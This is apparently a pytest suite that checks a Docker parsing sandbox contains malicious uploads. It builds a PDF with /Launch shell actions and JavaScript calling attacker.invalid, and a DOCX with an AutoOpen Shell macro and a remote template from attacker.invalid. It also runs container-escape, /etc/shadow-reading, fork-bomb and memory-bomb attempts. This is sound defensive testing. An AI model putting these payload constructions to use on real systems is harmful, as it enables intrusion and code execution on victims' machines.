"""AL-165 — FR-067: malicious files must not execute; the host must be unaffected.

Spec (Jira AL-165): create a test PDF containing a /Launch action (or an exec
attempt in a DOCX macro). Verify the sandbox prevents execution. Verify the
host system is unaffected.

These tests run against the real `rag-parser-sandbox` image and a real Docker
engine. They are skipped on machines without Docker and REQUIRED in CI.
"""
from __future__ import annotations

import hashlib
import io
import json
import os
import shutil
import subprocess
import uuid
import zipfile
from pathlib import Path

import pytest

from backend.app.core.config import settings
from backend.app.services.document_parser import (
    ParserSandboxError,
    build_docker_run_command,
    extract_text_sandboxed,
)


def _docker_ready() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        info = subprocess.run(["docker", "info"], capture_output=True, timeout=20)
        image = subprocess.run(
            ["docker", "image", "inspect", settings.PARSER_DOCKER_IMAGE],
            capture_output=True,
            timeout=20,
        )
    except (OSError, subprocess.TimeoutExpired):
        return False
    return info.returncode == 0 and image.returncode == 0


if not _docker_ready():
    if os.getenv("CI"):
        pytest.fail(
            "AL-165 requires Docker and the rag-parser-sandbox image in CI",
            pytrace=False,
        )
    pytest.skip(
        "Docker engine or rag-parser-sandbox image not available locally",
        allow_module_level=True,
    )


# --------------------------------------------------------------------------- helpers

def _sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def _leftover_containers(prefix: str = "rag-parser-") -> list[str]:
    out = subprocess.run(
        ["docker", "ps", "-a", "--filter", f"name={prefix}", "--format", "{{.Names}}"],
        capture_output=True,
        text=True,
        timeout=30,
    )
    return [name for name in out.stdout.split() if name]


def _build_pdf(objects: list[bytes]) -> bytes:
    """Assemble a valid PDF (correct xref offsets) from object bodies 1..n."""
    out = io.BytesIO()
    out.write(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = []
    for number, body in enumerate(objects, start=1):
        offsets.append(out.tell())
        out.write(b"%d 0 obj\n" % number + body + b"\nendobj\n")
    xref = out.tell()
    out.write(b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1))
    for offset in offsets:
        out.write(b"%010d 00000 n \n" % offset)
    out.write(b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objects) + 1, xref))
    return out.getvalue()


def _malicious_pdf(host_marker: Path) -> bytes:
    """PDF whose OpenAction tries to launch a shell and whose JS tries to run code."""
    marker = str(host_marker).replace("\\", "\\\\").encode()
    text_stream = b"BT /F1 12 Tf 72 720 Td (Quarterly report CONFIDENTIAL) Tj ET"
    return _build_pdf([
        # 1: catalog with an auto-run /Launch action and a JavaScript name tree
        b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R /Names << /JavaScript 7 0 R >> >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
        b"/Resources << /Font << /F1 6 0 R >> >> /AA << /O 5 0 R >> >>",
        b"<< /Length %d >>\nstream\n" % len(text_stream) + text_stream + b"\nendstream",
        # 5: /Launch for Windows and Unix — would write a marker file if ever executed
        b"<< /Type /Action /S /Launch /F (/bin/sh) "
        b"/Unix << /F (/bin/sh) /P (-c 'touch " + marker + b"') >> "
        b"/Win << /F (cmd.exe) /P (/c echo pwned > " + marker + b") >> >>",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
        b"<< /Names [(boot) 8 0 R] >>",
        b"<< /S /JavaScript /JS (app.launchURL('http://attacker.invalid/x'); "
        b"this.exportDataObject({cName:'p', nLaunch:2});) >>",
    ])


def _malicious_docx() -> bytes:
    """DOCX with a VBA macro part, an AutoOpen Shell payload and a remote template."""
    content_types = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        b'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        b'<Default Extension="xml" ContentType="application/xml"/>'
        b'<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
        b'<Override PartName="/word/document.xml" '
        b'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
        b'<Override PartName="/word/settings.xml" '
        b'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>'
        b"</Types>"
    )
    root_rels = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" '
        b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        b'Target="word/document.xml"/></Relationships>'
    )
    document = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        b"<w:body><w:p><w:r><w:t>Board minutes CONFIDENTIAL</w:t></w:r></w:p></w:body></w:document>"
    )
    document_rels = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId9" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" '
        b'Target="vbaProject.bin"/>'
        b'<Relationship Id="rId2" '
        b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" '
        b'Target="settings.xml"/></Relationships>'
    )
    settings_xml = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
        b'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
        b'<w:attachedTemplate r:id="rId1"/></w:settings>'
    )
    # Remote template injection: Word would fetch this URL on open.
    settings_rels = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" '
        b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        b'Target="http://attacker.invalid/payload.dotm" TargetMode="External"/></Relationships>'
    )
    vba = b"Attribute VB_Name = \"ThisDocument\"\nSub AutoOpen()\n  Shell \"cmd.exe /c calc.exe\"\nEnd Sub\n"

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("[Content_Types].xml", content_types)
        archive.writestr("_rels/.rels", root_rels)
        archive.writestr("word/document.xml", document)
        archive.writestr("word/_rels/document.xml.rels", document_rels)
        archive.writestr("word/settings.xml", settings_xml)
        archive.writestr("word/_rels/settings.xml.rels", settings_rels)
        archive.writestr("word/vbaProject.bin", vba)
    return buffer.getvalue()


def _run_payload_in_sandbox(host_file: Path, payload: str, timeout: int = 90) -> subprocess.CompletedProcess:
    """Run arbitrary Python inside the exact production sandbox (same hardening flags).

    Simulates the worst case: an exploit in the parser library achieved code
    execution inside the container. The sandbox must still contain it.
    """
    name = f"rag-parser-al165-{uuid.uuid4().hex[:8]}"
    cmd = build_docker_run_command(
        container_name=name,
        host_file_path=str(host_file.resolve()),
        container_input_path=f"/input/{host_file.name}",
        input_mode="mount",
    )
    image_index = cmd.index(settings.PARSER_DOCKER_IMAGE)
    cmd = cmd[:image_index] + ["--entrypoint", "python", settings.PARSER_DOCKER_IMAGE, "-c", payload]
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    finally:
        subprocess.run(["docker", "rm", "-f", name], capture_output=True, timeout=30)


# --------------------------------------------------------------------------- tests

def test_pdf_with_launch_and_javascript_actions_is_never_executed(tmp_path):
    marker = tmp_path / "PWNED_BY_PDF.txt"
    pdf = tmp_path / "invoice.pdf"
    pdf.write_bytes(_malicious_pdf(marker))
    before = _sha256(pdf)

    try:
        text = extract_text_sandboxed(pdf, "application/pdf", "invoice.pdf")
        assert "Quarterly report" in text  # only text comes back
    except ParserSandboxError:
        pass  # failing closed is also acceptable; executing is not

    assert not marker.exists(), "Launch action ran on the host"
    assert _sha256(pdf) == before, "input file was modified"
    assert not _leftover_containers(), "sandbox container left behind"


def test_docx_with_macro_and_remote_template_is_never_executed(tmp_path):
    docx = tmp_path / "minutes.docx"
    docx.write_bytes(_malicious_docx())
    before = _sha256(docx)

    text = extract_text_sandboxed(
        docx,
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "minutes.docx",
    )

    assert "Board minutes" in text
    assert "AutoOpen" not in text and "Shell" not in text, "macro source leaked into extracted text"
    assert _sha256(docx) == before
    assert not _leftover_containers()


ESCAPE_ATTEMPTS = r"""
import json, os, socket, sys, time
results = {}

def attempt(name, fn):
    try:
        fn()
        results[name] = "SUCCEEDED"
    except Exception as exc:
        results[name] = "blocked: " + type(exc).__name__

input_path = os.listdir("/input")[0]

attempt("overwrite_input_file", lambda: open("/input/" + input_path, "a").write("tampered"))
attempt("write_root_fs", lambda: open("/pwned.txt", "w").write("x"))
attempt("write_app_dir", lambda: open("/app/runner.py", "a").write("x"))
attempt("read_etc_shadow", lambda: open("/etc/shadow").read())
attempt("become_root", lambda: os.setuid(0))
attempt("raw_socket", lambda: socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP))
attempt("internet_egress", lambda: socket.create_connection(("1.1.1.1", 53), timeout=3))
attempt("dns_lookup", lambda: socket.getaddrinfo("example.com", 80))

def exec_from_tmp():
    with open("/tmp/x.sh", "w") as f:
        f.write("#!/bin/sh\necho hi\n")
    os.chmod("/tmp/x.sh", 0o755)
    os.execv("/tmp/x.sh", ["/tmp/x.sh"])
pid = os.fork()
if pid == 0:
    try:
        exec_from_tmp()
    finally:
        os._exit(99)
_, status = os.waitpid(pid, 0)
results["exec_from_tmp"] = "SUCCEEDED" if os.waitstatus_to_exitcode(status) == 0 else "blocked: noexec"

children = []
for _ in range(200):
    try:
        child = os.fork()
    except OSError:
        break
    if child == 0:
        time.sleep(5)
        os._exit(0)
    children.append(child)
results["fork_count"] = len(children)
for child in children:
    try:
        os.kill(child, 9)
    except Exception:
        pass

print("RESULTS=" + json.dumps(results))
"""


def test_code_execution_inside_sandbox_is_contained(tmp_path):
    """Worst case: attacker code runs inside the container. Nothing may escape."""
    victim = tmp_path / "victim.txt"
    victim.write_text("original host content", encoding="utf-8")
    before = _sha256(victim)

    proc = _run_payload_in_sandbox(victim, ESCAPE_ATTEMPTS)
    line = next((l for l in proc.stdout.splitlines() if l.startswith("RESULTS=")), None)
    assert line, f"payload did not report (rc={proc.returncode}): {proc.stderr[-800:]}"
    results = json.loads(line[len("RESULTS="):])

    for attempt_name in (
        "overwrite_input_file",
        "write_root_fs",
        "write_app_dir",
        "read_etc_shadow",
        "become_root",
        "raw_socket",
        "internet_egress",
        "dns_lookup",
        "exec_from_tmp",
    ):
        assert results[attempt_name].startswith("blocked"), f"{attempt_name}: {results[attempt_name]}"
    assert results["fork_count"] < 64, f"fork bomb not limited: {results['fork_count']} processes"

    assert _sha256(victim) == before, "host file modified from inside the sandbox"
    assert not (tmp_path / "pwned.txt").exists()


def test_memory_bomb_is_killed_by_the_512mb_limit(tmp_path):
    victim = tmp_path / "victim.txt"
    victim.write_text("x", encoding="utf-8")
    proc = _run_payload_in_sandbox(victim, "b = bytearray(900 * 1024 * 1024); print('ALLOCATED')")
    assert "ALLOCATED" not in proc.stdout
    assert proc.returncode == 137, f"expected OOM kill (137), got {proc.returncode}"
